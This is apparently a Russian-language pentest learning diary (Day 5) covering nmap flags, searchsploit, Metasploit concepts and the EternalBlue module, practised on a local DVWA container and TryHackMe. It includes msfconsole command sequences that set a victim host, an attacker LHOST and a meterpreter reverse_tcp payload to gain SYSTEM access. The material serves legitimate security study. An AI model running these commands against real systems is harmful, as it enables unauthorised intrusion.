# День 5 — nmap углублённо + Metasploit + searchsploit

**Дата:** 2 апреля 2026
**Платформа:** Kali Linux + Metasploit + TryHackMe
**Статус:** ✅ Завершён

---

## nmap — продвинутые флаги

### Основные флаги которые нужно знать наизусть

| Флаг | Что делает |
|---|---|
| `-sV` | Определить версии сервисов |
| `-sC` | Запустить стандартные NSE скрипты |
| `-A` | Всё сразу: версии + скрипты + ОС + traceroute |
| `-O` | Определить операционную систему |
| `-p-` | Сканировать все 65535 портов |
| `-T4` | Ускоренное сканирование |
| `--script vuln` | Автоматически искать уязвимости |
| `--min-rate=5000` | Минимальная скорость пакетов |

### Реальный результат сканирования DVWA (172.17.0.2)

```
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.25 (Debian)
| http-cookie-flags:
|   PHPSESSID: httponly flag not set   ← уязвимость!
| http-title: Login :: Damn Vulnerable Web Application
| http-robots.txt: 1 disallowed entry
OS: Linux 4.15 – 5.19
```

### Что нашёл nmap автоматически:
- **Apache 2.4.25** — точная версия → ищем в searchsploit
- **HttpOnly не установлен** — cookie уязвимы к XSS краже (мы это эксплуатировали вчера!)
- **robots.txt** — скрытые директории
- **ОС: Linux** — понимаем с чем работаем

### Стандартный workflow пентестера:
```
nmap -sV -sC [цель]  →  узнали версии
         ↓
searchsploit [сервис] [версия]  →  нашли эксплойты
         ↓
msfconsole  →  запустили атаку
```

---

## searchsploit — локальная база эксплойтов

searchsploit = локальная копия exploit-db.com прямо в Kali.
Работает без интернета — важно при пентесте в изолированных сетях.

### Команды:

```bash
searchsploit apache 2.4.25      # найти эксплойты для Apache 2.4.25
searchsploit openssh 7.9        # эксплойты для OpenSSH
searchsploit ms17-010           # знаменитый EternalBlue
searchsploit -m 42315           # скопировать эксплойт по номеру
searchsploit --update            # обновить базу
```

### Найденные уязвимости для Apache 2.4.25:

| Уязвимость | Тип |
|---|---|
| Apache 2.4.17 < 2.4.38 — apache2ctl logrotate | Local Privilege Escalation |
| Apache < 2.4.27 — OPTIONS Memory Leak | Утечка памяти |
| Apache mod_ssl < 2.8.7 — OpenFuck | Remote Buffer Overflow |

---

## Metasploit Framework

Metasploit — главный фреймворк для эксплуатации уязвимостей.
База: 2000+ эксплойтов, 500+ payload, 250+ вспомогательных модулей.

### Ключевые понятия:

| Термин | Что это |
|---|---|
| **Exploit** | Код который использует уязвимость |
| **Payload** | Что выполняется после эксплойта |
| **Meterpreter** | Продвинутый shell для пост-эксплуатации |
| **Auxiliary** | Вспомогательные модули (сканеры, брутфорс) |
| **Post** | Модули для пост-эксплуатации |
| **RHOSTS** | IP адрес цели (Remote HOST) |
| **LHOST** | Твой IP (Local HOST) для обратного соединения |
| **LPORT** | Твой порт для обратного соединения |

### Основные команды msfconsole:

```bash
msfconsole                              # запустить
search eternalblue                      # поиск модуля
use exploit/windows/smb/ms17_010_eternalblue  # выбрать модуль
show options                            # что нужно настроить
show payloads                           # доступные payload
info                                    # полная информация о модуле
set RHOSTS 192.168.1.1                  # установить цель
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # выбрать payload
run (или exploit)                       # запустить атаку
back                                    # выйти из модуля
exit                                    # выйти из msfconsole
```

---

## MS17-010 EternalBlue — изучили изнутри

### Что это:
- Критическая уязвимость в Windows SMBv1
- Разработана АНБ США (Equation Group)
- Утекла через Shadow Brokers в 2017 году
- CVE-2017-0143 до CVE-2017-0148 (6 CVE!)
- Использована WannaCry → 200,000+ заражённых компьютеров в 150 странах

### Уязвимые системы:
Windows 7, 8, 8.1, Server 2008 R2, Server 2012, Windows 10

### Модуль в Metasploit:
```
exploit/windows/smb/ms17_010_eternalblue
Rank: Average
Platform: Windows x64
Privileged: Yes (даёт SYSTEM права!)
```

### Как бы выглядела атака на уязвимую машину:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [IP жертвы]
set LHOST [мой IP]
run
# → получаем meterpreter сессию с правами SYSTEM
```

---

## TryHackMe — Metasploit Introduction

- ✅ Task 1: Introduction to Metasploit
- ✅ Task 2: Main Components (exploit, payload, auxiliary, post, encoder)
- ✅ Task 3: msfconsole commands
- ✅ Пройдена полностью

---

## Что сделал сегодня

- [x] nmap -A на Docker контейнер с DVWA — нашёл Apache 2.4.25 + уязвимость HttpOnly
- [x] searchsploit apache 2.4.25 — нашёл список CVE
- [x] searchsploit ms17-010 — нашёл EternalBlue
- [x] msfconsole — изучил интерфейс
- [x] search eternalblue — нашёл модуль
- [x] show options / info — изучил настройки модуля
- [x] TryHackMe Metasploit Introduction — пройдена

---

## Завтра — День 6

- Сетевые атаки: ARP Spoofing
- Man-in-the-Middle атака
- Bettercap — перехват трафика
- Написание Snort правила для детектирования
- Настройка iptables firewall
